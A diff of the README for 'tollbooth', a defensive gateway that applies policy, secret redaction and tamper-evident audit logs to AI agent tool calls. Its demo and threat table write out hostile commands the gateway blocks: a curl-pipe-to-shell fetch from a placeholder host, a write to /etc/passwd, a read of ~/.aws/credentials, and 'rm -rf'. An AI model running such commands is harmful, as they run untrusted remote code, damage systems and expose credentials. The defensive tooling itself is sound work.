@@ -1,25 +1,80 @@
-# tollbooth
+<p align="center">
+  <img src="assets/header.svg" alt="tollbooth — a firewall + DLP + audit layer for AI agent tool traffic" width="860">
+</p>
 
-A security gateway for AI agents: a transparent MCP proxy that enforces policy on every tool call and result passing between your MCP client (Claude Code, Claude Desktop, Cursor, custom agents) and its MCP servers.
+<p align="center">
+  <a href="#"><img alt="Python 3.12+" src="https://img.shields.io/badge/python-3.12%2B-3776AB?logo=python&logoColor=white"></a>
+  <a href="#"><img alt="Built on MCP" src="https://img.shields.io/badge/built%20on-MCP-58A6FF"></a>
+  <a href="#development"><img alt="319 tests" src="https://img.shields.io/badge/tests-319%20passing-3FB950"></a>
+  <a href="#design-decisions-that-matter"><img alt="Fail-closed by default" src="https://img.shields.io/badge/default-fail--closed-F85149"></a>
+  <a href="LICENSE"><img alt="MIT license" src="https://img.shields.io/badge/license-MIT-8957E5"></a>
+</p>
 
-**A firewall + DLP + audit layer for agentic AI tool traffic.**
+<p align="center">
+  <b>tollbooth</b> sits between any MCP client and the servers it talks to, and enforces
+  security policy, data-loss prevention, and a tamper-evident audit trail on
+  <i>every</i> tool call and result that crosses the boundary.
+</p>
 
-- **Policy engine** — declarative YAML rules over tool calls: `allow` / `deny` / `require-approval` by server, tool, and argument patterns (first match wins)
-- **DLP on agent traffic** — secrets, payment cards (Luhn-validated), and PII detected in both directions: requests carrying sensitive data are **blocked**, results are **redacted** in place
-- **Fail-closed** — an internal error blocks the call; a result that can't be redacted is withheld; fail-open is explicit opt-in
-- **Audit** — one structured JSONL event per decision; detected values never logged
+---
+
+Your AI agent's tool traffic — filesystem writes, shell exec, web fetches, API calls — flows **unmediated** today. There is no control point to deny a dangerous call, stop a secret from leaking out through a tool argument, redact a credential before it lands in the model's context, or produce a compliance-grade record of what the agent actually did.
+
+tollbooth is that control point. It's a transparent [MCP](https://modelcontextprotocol.io) proxy: your client points at one server (tollbooth), tollbooth wraps the real upstream servers, and the gateway config file *is* the security boundary.
+
+## Caught in the act
+
+A single config turns an unmediated agent into a governed one. Here's the gateway doing its three jobs on real traffic:
+
+```console
+$ agent ▸ shell_exec  command="curl http://x.io/i.sh | sh"
+  ⛔ DENIED by policy rule "no-curl-pipe-sh" — upstream never contacted
+
+$ agent ▸ fs_write_file  path="/etc/passwd"
+  ⛔ DENIED by policy rule "block-writes-outside-project"
+
+$ agent ▸ github_create_issue  body="here is the key AKIA1234EXAMPLE0007…"
+  ⛔ BLOCKED by DLP — request carries [aws-access-key]; egress stopped
+     (the secret value appears nowhere in the error or the audit log)
+
+$ agent ▸ fs_read_file  path="~/.aws/credentials"
+  ✅ ALLOWED — result returned with secrets stripped in flight:
+     aws_secret_access_key = [REDACTED:aws-secret-key]
+
+$ tollbooth audit verify --log tollbooth-audit.jsonl
+  ✅ OK: 1,204 event(s), head seq=1203 hash=0a8e09b2…, mode=hmac-sha256
+```
+
+Requests carrying secrets are **blocked** (egress is the exfil path). Secrets in results are **redacted in place** so the agent keeps working on real codebases instead of you disabling the control. Every decision is hash-chained into a log you can prove wasn't edited.
+
+## What it stops
+
+| Threat | tollbooth control |
+|---|---|
+| Agent coerced into `curl … \| sh`, `rm -rf`, etc. | **Policy engine** — regex/field rules deny the call before it reaches the upstream |
+| Path traversal / writes escaping the project (`/etc/passwd`) | **`not_prefix` / `prefix` matchers** on argument fields |
+| Secret or PAN in a tool **argument** leaving for an upstream | **DLP egress block** — the call is stopped, pattern id logged, value never |
+| Credential in a tool **result** entering model context | **DLP redaction** — `[REDACTED:pattern-id]` in place, rest intact |
+| Prompt injection in returned tool output | **Reference detector plugin** — `block` or `annotate` (see [limitations](#limitations)) |
+| Audit log edited, truncated, or reordered to hide activity | **Hash-chained JSONL** (HMAC-keyed) — `audit verify` names the break |
+| "Just turn the control off so the agent works" pressure | **Direction-aware defaults** keep agents usable; **fail-closed** on any internal error |
 
 ## How it works
 
 ```
-MCP client ──▶ tollbooth (policy ▸ DLP ▸ audit) ──▶ your real MCP servers
+client ──tool call──▶ tollbooth ──▶ [ policy → DLP-request → plugins ] ──▶ upstream
+client ◀──result──── tollbooth ◀── [ DLP-result → plugins ] ◀──────────── upstream
+                          │
+                          └──▶ tamper-evident audit log (one event per decision)
 ```
 
-Your client config points at one server: tollbooth. Tollbooth launches the real upstream servers, exposes their tools namespaced as `{server}_{tool}`, and enforces policy on every call.
+One aggregating gateway process is an MCP **server** to your client and an MCP **client** to N upstream servers. It exposes the union of upstream tools, namespaced `{server}_{tool}`, routed through a mapping table (never string-splitting — server names can contain underscores). Absent any policy, behavior is identical to a direct connection.
 
 ## Quickstart
 
 ```bash
+git clone https://github.com/Realgagenichols/tollbooth.git
+cd tollbooth
 uv sync
 
 # 1. Write a gateway config (see examples/tollbooth.yaml) — or bootstrap one
@@ -35,11 +90,11 @@ uv run tollbooth validate -c tollbooth.yaml
 uv run tollbooth emit-config -c tollbooth.yaml
 ```
 
-The client then talks to `tollbooth run -c tollbooth.yaml`, which proxies everything through the policy pipeline.
+Your client then talks to `tollbooth run -c tollbooth.yaml`, which proxies everything through the pipeline.
 
 ## Upstream servers
 
-Each entry under `servers:` is classified by which field it declares — `command` for a local stdio server (a subprocess), or `url` for a remote streamable-HTTP server. An entry with neither, or both, is a config error.
+Each entry under `servers:` is classified by which field it declares — `command` for a local stdio server (a subprocess) or `url` for a remote streamable-HTTP server. An entry with neither, or both, is a config error.
 
 ```yaml
 servers:
@@ -54,7 +109,7 @@ servers:
       Authorization: Bearer ${REMOTE_TOKEN}
 ```
 
-HTTP header values may reference environment variables as `${VAR}`, resolved at startup — so tokens live in the environment, never in `tollbooth.yaml`. A referenced variable that is unset fails closed at startup, naming the variable (never its value). `tollbooth import` brings both `command` and `url` entries in from an existing client config.
+HTTP header values may reference environment variables as `${VAR}`, resolved at startup — so tokens live in the environment, never in `tollbooth.yaml`. A referenced variable that is unset fails closed at startup, naming the variable (never its value). Errors about an HTTP upstream echo only the URL **origin** (`scheme://host[:port]`) — never userinfo, path, query, or header content. A dead HTTP upstream returns a clean error for *its* calls without taking the gateway down. `tollbooth import` brings both `command` and `url` entries in from an existing client config.
 
 > OAuth for HTTP upstreams (interactive login + token refresh) is **not** supported yet — use a `${VAR}` bearer token from a long-lived or externally-refreshed credential. Tracked as a future change (N2).
 
@@ -62,7 +117,7 @@ HTTP header values may reference environment variables as `${VAR}`, resolved at 
 
 ```yaml
 policy:
-  default: deny          # decision when no rule matches
+  default: deny          # decision when no rule matches (allowlist posture)
   failure_mode: closed   # internal error => block (set `open` to log-and-continue)
   rules:
     - name: block-writes-outside-project
@@ -74,13 +129,13 @@ policy:
           not_prefix: /Users/me/project
 ```
 
-Rules are evaluated top-down; the first match decides. `require-approval` blocks the call with a message naming the rule and how to permit it — distinct from a hard deny.
+Rules are evaluated top-down; the first match decides. `require-approval` blocks the call with a message naming the rule and how to permit it — distinct from a hard deny, and an extensible enum so a future approval TUI / MCP elicitation slots in without reworking the model.
 
 > **Gotcha:** a rule with a `where:` block can only fire when that argument is present in the call. Negative matchers + `default: allow` can be bypassed by argument omission — prefer `default: deny` for guard configs.
 
 ## DLP
 
-Enabled by default (`dlp.enabled: true`). Direction-aware: a detection in a tool call's **arguments blocks the call** (egress is the exfil path); a detection in a **result is redacted** in place as `[REDACTED:{pattern-id}]` so the agent keeps working. Dict keys and numeric values that would need redaction withhold the whole result instead — nothing sensitive passes because it arrived in an awkward shape.
+Enabled by default (`dlp.enabled: true`). Direction-aware: a detection in a tool call's **arguments blocks the call** (egress is the exfil path); a detection in a **result is redacted** in place as `[REDACTED:{pattern-id}]` so the agent keeps working. Overlapping detections resolve to the most specific match. Dict keys and numeric values that would need redaction withhold the whole result instead — nothing sensitive passes because it arrived in an awkward shape.
 
 | Pattern id | Detects |
 |---|---|
@@ -120,13 +175,11 @@ audit:
   record: metadata        # or "full" — see below
 ```
 
-(`audit_log: <path>` is the pre-M3 spelling and still works.)
-
 ```json
 {"event": "decision", "call_id": "2a2b0cca…", "path": "request", "server": "fs", "tool": "write_file", "decision": "deny", "reason_id": "block-writes-outside-project", "v": 2, "ts": "2026-06-12T10:00:00+00:00", "seq": 5, "prev": "df412ac5…", "session": "f32a7ae3…"}
 ```
 
-DLP decisions are audited by pattern id, never value: a blocked request logs `"reason_id": "dlp:pan"`, a redacted result logs `"reason_id": "redacted:aws-access-key"`. Decisions made because a security check was skipped (fail-open) are tagged `fail-open:<stage>` — the audit trail never hides a degraded state.
+DLP decisions are audited by pattern id, never value: a blocked request logs `"reason_id": "dlp:pan"`, a redacted result logs `"reason_id": "redacted:aws-access-key"`. Decisions made because a security check was skipped (fail-open) are tagged `fail-open:<stage>` — the trail never hides a degraded state. (`audit_log: <path>` is the pre-M3 spelling and still works.)
 
 ### Tamper evidence
 
@@ -156,12 +209,7 @@ tollbooth audit replay <session-id> --log audit.jsonl
 
 ## Plugins
 
-Beyond the built-in policy and DLP stages you can load your own interceptors,
-declared in config as `module:factory` import specs. Plugins run **after** the
-built-ins, in declared order — they can tighten a verdict but never loosen one
-(the first non-`allow` decision short-circuits), and they run under the same
-fail-closed semantics: a plugin that raises at runtime denies the call (or
-withholds the result).
+Beyond the built-in policy and DLP stages you can load your own interceptors, declared in config as `module:factory` import specs. Plugins run **after** the built-ins, in declared order — they can tighten a verdict but never loosen one (the first non-`allow` decision short-circuits), under the same fail-closed semantics: a plugin that raises at runtime denies the call (or withholds the result).
 
 ```yaml
 plugins:
@@ -170,16 +218,7 @@ plugins:
       action: annotate    # plugin-specific settings dict, passed to the factory
 ```
 
-The module must be importable by the tollbooth process. The installed
-`tollbooth` console script does **not** add the current directory to
-`sys.path`, so a plugin living in your working tree needs
-`PYTHONPATH=/path/to/it` (or, better, pip-install it as a package). Loading is
-fail-fast: an import error, a factory that raises, a name collision with a
-built-in, or an interceptor implementing neither hook aborts startup naming the
-plugin (and reporting the exception **type** only — settings values are never
-echoed). Auto-discovery is deliberately *not* supported: the config file is the
-security boundary, so installing a package must never silently insert an
-interceptor.
+Loading is fail-fast: an import error, a factory that raises, a name collision with a built-in, or an interceptor implementing neither hook aborts startup naming the plugin (reporting the exception **type** only — settings values are never echoed). Auto-discovery is deliberately *not* supported: the config file is the security boundary, so installing a package must never silently insert an interceptor.
 
 Write one against the public API (`from tollbooth import ...`):
 
@@ -191,61 +230,79 @@ class TagInternalHosts:
 
     def check_request(self, call: ToolCall) -> PolicyResult:
         # Return DENY/REQUIRE_APPROVAL to short-circuit, or ALLOW to pass.
-        # rule_name names the verdict in the audit log (None for an allow).
         if "10.0." in str(call.args.get("url", "")):
             return PolicyResult(decision=Decision.DENY, rule_name=self.name,
                                 message="internal host blocked")
         return PolicyResult(decision=Decision.ALLOW, rule_name=None, message="ok")
 
     def check_result(self, call: ToolCall, content: str) -> ResultEdit:
-        # Transform content + report reason_ids for audit, or
-        # `raise BlockResult(reason_id)` to withhold the result entirely.
+        # Transform content, or `raise BlockResult(reason_id)` to withhold it.
         return ResultEdit(content=content)
 
 def create(settings: dict) -> "TagInternalHosts":
     return TagInternalHosts()
 ```
 
-An interceptor may implement `check_request`, `check_result`, or both. Exported
-types: `ToolCall`, `PolicyResult`, `ResultEdit`, `BlockResult`, `Decision`,
-`RequestInterceptor`, `ResultInterceptor`. The shipped
-`examples/plugins/prompt_injection.py` is a reference result-path detector
-(instruction-override heuristics; `action: block | annotate`) — explicitly not
-production-grade, it exists to show a detector slotting into this interface.
+An interceptor may implement `check_request`, `check_result`, or both. Exported types: `ToolCall`, `PolicyResult`, `ResultEdit`, `BlockResult`, `Decision`, `RequestInterceptor`, `ResultInterceptor`. The shipped `examples/plugins/prompt_injection.py` is a reference result-path detector — see [limitations](#limitations).
 
 ## Claude Code hooks
 
-The same policy + DLP engine runs as Claude Code
-[PreToolUse/PostToolUse hooks](https://docs.claude.com/en/docs/claude-code/hooks),
-governing the client's *own* tools (Bash, Edit, ...) — not just proxied MCP
-servers. `tollbooth hook pre|post` reads the hook event JSON on stdin and
-answers on stdout:
+The same policy + DLP engine runs as Claude Code [PreToolUse/PostToolUse hooks](https://docs.claude.com/en/docs/claude-code/hooks), governing the client's *own* tools (Bash, Edit, ...) — not just proxied MCP servers. `tollbooth hook pre|post` reads the hook event JSON on stdin and answers on stdout:
 
-- **pre** — `deny` → `permissionDecision: "deny"` naming the rule;
-  `require-approval` → `"ask"` with the approvable message; `allow` → **no
-  output**, deferring to Claude Code's own permission prompt (tollbooth never
-  auto-approves).
-- **post** — DLP redactions come back via `updatedToolOutput`; a per-pattern
-  `block` override replaces the output with a withholding message.
+- **pre** — `deny` → `permissionDecision: "deny"` naming the rule; `require-approval` → `"ask"` with the approvable message; `allow` → **no output**, deferring to Claude Code's own permission prompt (tollbooth never auto-approves).
+- **post** — DLP redactions come back via `updatedToolOutput`; a per-pattern `block` override replaces the output with a withholding message.
 
-Native tools route as server `claude` (e.g. a rule for server `claude`, tool
-`Bash`); MCP tools arrive as `mcp__{server}__{tool}` and route as
-`(server, tool)`. Any internal error — malformed stdin, broken config, a
-pipeline crash — fails closed (deny on pre, withheld output on post) and never
-echoes input values. Audit events append to the configured log under Claude's
-`session_id`, with cross-process locking so concurrent hook invocations keep
-the hash chain intact.
-
-Emit the settings block (absolute, shell-quoted binary + config paths) and
-merge it into `.claude/settings.json`:
+Native tools route as server `claude` (e.g. a rule for server `claude`, tool `Bash`); MCP tools arrive as `mcp__{server}__{tool}` and route as `(server, tool)`. Any internal error — malformed stdin, broken config, a pipeline crash — fails closed and never echoes input values. Audit events append under Claude's `session_id`, with cross-process locking so concurrent hook invocations keep the hash chain intact.
 
 ```bash
-tollbooth emit-config --claude-hooks -c tollbooth.yaml
+tollbooth emit-config --claude-hooks -c tollbooth.yaml   # merge into .claude/settings.json
 ```
+
+## Design decisions that matter
+
+The point of tollbooth isn't that it proxies MCP — it's the judgment calls a security control has to get right:
+
+- **Fail-closed by default.** Any error in policy, DLP, or redaction *denies* the call; a result that can't be redacted is withheld. A control that fails open is not a control. Fail-open is an explicit, audited opt-in.
+- **Detected values never appear in logs or errors.** Audit records pattern/rule **ids**, not matches. Payload recording is opt-in *and* post-enforcement only — the log holds what crossed the boundary, never blocked secrets.
+- **Direction-aware DLP** — requests **block**, results **redact**. Redacting outbound arguments would silently corrupt calls; blocking every result would make agents unusable and get the control disabled. Egress is the true exfil path, so that's where the hard stop lives.
+- **Tamper evidence is keyed.** The hash chain detects edits, deletions, and reordering; with `TOLLBOOTH_AUDIT_KEY` set, an attacker who rewrites the whole file still can't forge a valid chain.
+- **The config file is the security boundary.** Plugins are explicitly declared `module:factory` specs with fail-fast loading — never entry-point auto-discovery, so installing a package can't silently insert an interceptor.
+- **Plugins run after built-ins and only tighten.** A plugin can never pre-empt a built-in deny; the hook adapter's `allow` defers to the client's own prompt rather than auto-approving.
+
+## Limitations
+
+Stated plainly, because a security tool that overclaims is worse than one that doesn't:
+
+- **Prompt-injection detection is a reference, not production-grade.** The shipped detector proves the plugin interface; it matches a small set of instruction-override heuristics and *will* miss real attacks. Treat it as an integration example.
+- **No OAuth for HTTP upstreams yet** (N2) — use a `${ENV_VAR}` bearer token.
+- **tollbooth governs tool traffic, not the LLM API itself.** It does not see or modify model completions.
+- **Non-tool MCP traffic** (resources, prompts) is proxied transparently but **not yet scanned** — a later milestone.
+- **Local, single-process.** No graphical UI and no hosted/multi-tenant deployment; tollbooth runs alongside the client.
+
+## Architecture
+
+| Module | Responsibility |
+|--------|---------------|
+| `main` | CLI: `run`, `emit-config`, `validate`, `import`, `audit verify\|query\|replay`, `hook pre\|post` |
+| `config` | Load + pydantic-validate `tollbooth.yaml`; emit/import client config |
+| `proxy` | Client-facing MCP server; tool aggregation + namespacing; routes through the pipeline |
+| `upstream` | `UpstreamTransport` interface + `StdioUpstream` / `HttpUpstream` (supervised); `build_upstream` factory |
+| `policy` | YAML rules, field matchers, first-match-wins, extensible `Decision` enum |
+| `pipeline` | Ordered interceptor chain (request + result paths); policy and DLP are interceptors |
+| `dlp` | Secrets / PAN (Luhn) / PII patterns; overlap suppression; direction-aware actions |
+| `audit` | Hash-chained JSONL log; opt-in HMAC + payload recording; query/replay |
+| `plugins` | Config-declared interceptor loading + fail-fast validation; documented public API |
+| `hook` | Claude Code hook adapter: stdin event → pipeline → hook decision JSON |
+
+Stack: the official `mcp` Python SDK, `pydantic`, and `pyyaml` — no other runtime dependencies. Full requirements and Given/When/Then scenarios live in [`SPEC.md`](SPEC.md).
 
 ## Development
 
 ```bash
-uv run pytest          # full suite, incl. a real-subprocess gateway E2E
+uv run pytest          # 319 tests, incl. a real-subprocess gateway E2E
 uv run ruff check .    # lint
 ```
+
+## License
+
+[MIT](LICENSE) © Gage Nichols
